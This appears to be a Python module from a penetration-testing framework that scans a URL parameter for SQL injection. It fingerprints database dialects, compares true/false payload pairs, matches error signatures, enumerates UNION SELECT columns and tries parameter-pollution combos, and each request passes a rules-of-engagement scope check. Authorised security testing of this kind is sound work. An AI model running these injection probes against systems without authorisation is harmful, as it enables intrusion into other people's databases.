from __future__ import annotations

from urllib.parse import quote as _urlquote

from ..config import load_engine
from ..util import is_reflection
from ..contract import Capability, make_result
from ..roe_guard import ROEGuard, ROEViolation
from .. import http as _http
from ..payloads import pick
from . import sqli_pack


CAPABILITY = Capability(
    name="sqli_scan",
    description="SQL injection via tiered payload pack with dialect fingerprinting.",
    category="injection",
    cost="medium",
    destructive=False,
    idempotent=True,
)


ERROR_SIGNATURES = [
    "sql syntax", "sqlstate", "mysql_fetch", "mysql_num_rows",
    "mysql_query", "warning: mysql_", "valid mysql result",
    "postgresql", "pg_query", "psql:", "sqlite_", "sqlite/jdbcdriver",
    "unclosed quotation mark", "microsoft ole db", "odbc sql server driver",
    "jdbc", "java.sql.sqlexception", "oracle error", "ora-0",
    "quoted string not properly terminated", "unterminated quoted string",
]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return "ROE guard unavailable (fail-closed): %s" % e
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _send(url, method, param, payload, headers, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"blocked": True, "error": "ROE_BLOCK: " + viol}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                r = c.post(url, data={param: payload},
                           headers=headers or {})
            else:
                r = c.get(url, params={param: payload},
                          headers=headers or {})
        return {"status": r.status_code,
                "body": (r.text or "")[:8000],
                "time_ms": 0.0}
    except Exception as e:
        return {"status": None, "error": "%s: %s" % (type(e).__name__, e),
                "time_ms": 0.0}


def _send_hpp(url, method, param, first, second, headers, timeout, verify,
              roe_guard):
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"blocked": True, "error": "ROE_BLOCK: " + viol}
    pairs = [(param, first), (param, second)]
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "POST":
                encoded = "&".join(
                    "%s=%s" % (k, _urlquote(str(v), safe=""))
                    for k, v in pairs)
                body = encoded.encode("utf-8")
                r = c.post(url, content=body, headers={
                    **(headers or {}),
                    "Content-Type": "application/x-www-form-urlencoded",
                })
            else:
                r = c.get(url, params=pairs, headers=headers or {})
        return {"status": r.status_code,
                "body": (r.text or "")[:8000]}
    except Exception as e:
        return {"status": None, "error": "%s: %s" % (type(e).__name__, e)}


def _error_hits(body):
    low = (body or "").lower()
    return [s for s in ERROR_SIGNATURES if s in low]


def probe_dialect(url, param, method="GET", headers=None, timeout=8,
                  verify=None, roe_guard=None):
    if verify is None:
        verify = _verify_tls()
    for dialect, probes in sqli_pack.DIALECT_PROBES.items():
        for p in probes:
            r = _send(url, method, param, p, headers, timeout, verify, roe_guard)
            if r.get("blocked"):
                return None, r
            body = r.get("body") or ""
            hits = _error_hits(body)
            if hits:
                return dialect, {"probe": p, "signatures": hits,
                                 "status": r.get("status")}
    return None, {"status": None, "note": "no dialect fingerprint"}


def probe_differential(url, param, method="GET", headers=None, timeout=8,
                       verify=None, roe_guard=None):
    if verify is None:
        verify = _verify_tls()
    attempts = []
    findings = []
    for true_p, false_p in sqli_pack.DIFFERENTIAL_PAIRS:
        r_true = _send(url, method, param, true_p, headers, timeout, verify,
                       roe_guard)
        if r_true.get("blocked"):
            return {"blocked": True, "error": r_true["error"]}
        r_false = _send(url, method, param, false_p, headers, timeout, verify,
                        roe_guard)
        if r_false.get("blocked"):
            return {"blocked": True, "error": r_false["error"]}
        attempts.append({
            "pair": (true_p, false_p),
            "true_status": r_true.get("status"),
            "false_status": r_false.get("status"),
            "true_len": len(r_true.get("body") or ""),
            "false_len": len(r_false.get("body") or ""),
        })
        if r_true.get("status") is not None \
                and r_false.get("status") is not None \
                and r_true["status"] == r_false["status"]:
            tlen = len(r_true.get("body") or "")
            flen = len(r_false.get("body") or "")
            if tlen and flen:
                ratio = abs(tlen - flen) / max(tlen, flen)
                if ratio > 0.15:
                    findings.append({
                        "payload_true": true_p,
                        "payload_false": false_p,
                        "true_len": tlen, "false_len": flen,
                        "delta_pct": round(ratio, 3),
                    })
                    break
    return {"attempts": attempts, "findings": findings}


def probe_error(url, param, method="GET", headers=None, timeout=8,
                verify=None, roe_guard=None, payloads=None):
    if verify is None:
        verify = _verify_tls()
    if payloads is None:
        payloads = ["'", '"', "')", "';", "\\'", "1'", "1 OR 1=1-- -"]
    attempts = []
    findings = []
    for payload in payloads:
        r = _send(url, method, param, payload, headers, timeout, verify,
                  roe_guard)
        if r.get("blocked"):
            return {"blocked": True, "error": r["error"]}
        hits = _error_hits(r.get("body") or "")
        attempts.append({"payload": payload, "status": r.get("status"),
                         "error_signatures": hits})
        if hits:
            findings.append({"payload": payload, "signatures": hits,
                             "preview": (r.get("body") or "")[:300]})
            break
    return {"attempts": attempts, "findings": findings}


def probe_union(url, param, method="GET", headers=None, timeout=8,
                verify=None, roe_guard=None, max_cols=10):
    if verify is None:
        verify = _verify_tls()
    marker = sqli_pack.UNION_MARKER
    attempts = []
    findings = []
    for ncols in range(1, max_cols + 1):
        cols = ",".join(["'%s_%d'" % (marker, i) for i in range(ncols)])
        for tmpl in ("' UNION SELECT {cols}-- -",
                     "1' UNION SELECT {cols}-- -",
                     "' UNION ALL SELECT {cols}-- -"):
            payload = tmpl.format(cols=cols)
            r = _send(url, method, param, payload, headers, timeout, verify,
                      roe_guard)
            if r.get("blocked"):
                return {"blocked": True, "error": r["error"]}
            body = r.get("body") or ""
            marker_present = marker in body
            payload_echoed = is_reflection(body, payload)
            attempts.append({"columns": ncols, "template": tmpl,
                             "status": r.get("status"),
                             "reflected": marker_present,
                             "payload_echoed": payload_echoed})
            if marker_present and not payload_echoed:
                findings.append({"columns": ncols, "template": tmpl,
                                 "payload": payload,
                                 "preview": body[:400]})
                return {"attempts": attempts, "findings": findings}
    return {"attempts": attempts, "findings": findings}


def probe_hpp_combos(url, param, method="GET", headers=None, timeout=8,
                     verify=None, roe_guard=None):
    if verify is None:
        verify = _verify_tls()
    attempts = []
    findings = []
    baseline = _send(url, method, param, "1", headers, timeout, verify,
                     roe_guard)
    if baseline.get("blocked"):
        return {"blocked": True, "error": baseline["error"]}
    baseline_len = len(baseline.get("body") or "")
    for label, first, second in sqli_pack.HPP_COMBOS:
        r = _send_hpp(url, method, param, first, second, headers, timeout,
                      verify, roe_guard)
        if r.get("blocked"):
            return {"blocked": True, "error": r["error"]}
        body = r.get("body") or ""
        hits = _error_hits(body)
        attempts.append({"combo": label, "status": r.get("status"),
                         "error_signatures": hits,
                         "len": len(body)})
        if hits:
            findings.append({"combo": label, "signatures": hits,
                             "preview": body[:300]})
        elif baseline_len and body \
                and abs(len(body) - baseline_len) / max(baseline_len, 1) > 0.2:
            findings.append({"combo": label,
                             "note": "response length delta vs baseline",
                             "baseline_len": baseline_len,
                             "combo_len": len(body)})
    return {"attempts": attempts, "findings": findings}


def scan(target_url, param=None, method="GET", headers=None, roe_guard=None,
         timeout=8, probes=None, max_cols=10, waf=None, budget=None):
    verify = _verify_tls()
    if not param:
        return make_result(
            {"verdict": "UNKNOWN",
             "reason": "no parameter specified for SQLi testing"},
            capability="sqli_scan", args=(target_url,))

    pack = sqli_pack.PACK
    error_payloads = pick(pack, ctx=None, waf=waf, budget=15)
    probes = probes or ["dialect", "differential", "error", "union", "hpp"]
    results = {}
    findings = []

    if "dialect" in probes:
        dialect, ev = probe_dialect(target_url, param, method, headers,
                                    timeout, verify, roe_guard)
        results["dialect"] = {"dialect": dialect, "evidence": ev}
        if dialect:
            findings.append({"probe": "dialect", "dialect": dialect, **ev})

    if "differential" in probes:
        r = probe_differential(target_url, param, method, headers, timeout,
                                verify, roe_guard)
        if r.get("blocked"):
            return make_result({"verdict": "UNKNOWN", "reason": r["error"]},
                               capability="sqli_scan", args=(target_url,))
        results["differential"] = r
        for f in r.get("findings") or []:
            findings.append({"probe": "differential", **f})

    if "error" in probes:
        r = probe_error(target_url, param, method, headers, timeout, verify,
                        roe_guard, payloads=error_payloads)
        if r.get("blocked"):
            return make_result({"verdict": "UNKNOWN", "reason": r["error"]},
                               capability="sqli_scan", args=(target_url,))
        results["error"] = r
        for f in r.get("findings") or []:
            findings.append({"probe": "error", **f})

    if "union" in probes:
        r = probe_union(target_url, param, method, headers, timeout, verify,
                        roe_guard, max_cols=max_cols)
        if r.get("blocked"):
            return make_result({"verdict": "UNKNOWN", "reason": r["error"]},
                               capability="sqli_scan", args=(target_url,))
        results["union"] = r
        for f in r.get("findings") or []:
            findings.append({"probe": "union", **f})

    if "hpp" in probes:
        r = probe_hpp_combos(target_url, param, method, headers, timeout,
                              verify, roe_guard)
        if r.get("blocked"):
            return make_result({"verdict": "UNKNOWN", "reason": r["error"]},
                               capability="sqli_scan", args=(target_url,))
        results["hpp"] = r
        for f in r.get("findings") or []:
            findings.append({"probe": "hpp", **f})

    if findings:
        strong = [f for f in findings
                  if f.get("probe") in ("differential", "error", "union",
                                        "dialect")]
        verdict = "VULNERABLE" if strong else "SUSPICIOUS"
        reason = "SQLi on '%s' via %s" % (
            param, ", ".join(sorted({f["probe"] for f in findings})))
        return make_result({
            "verdict": verdict,
            "reason": reason,
            "evidence": {"param": param, "findings": findings[:5],
                          "dialect": results.get("dialect", {}).get("dialect")},
        }, capability="sqli_scan", args=(target_url,))

    any_live = any((results.get(p) or {}).get("attempts") for p in probes)
    if any_live:
        return make_result({
            "verdict": "PASS",
            "reason": "no SQLi signal on '%s'" % param,
        }, capability="sqli_scan", args=(target_url,))

    return make_result({
        "verdict": "UNKNOWN",
        "reason": "SQLi probes inconclusive (no live responses)",
    }, capability="sqli_scan", args=(target_url,))
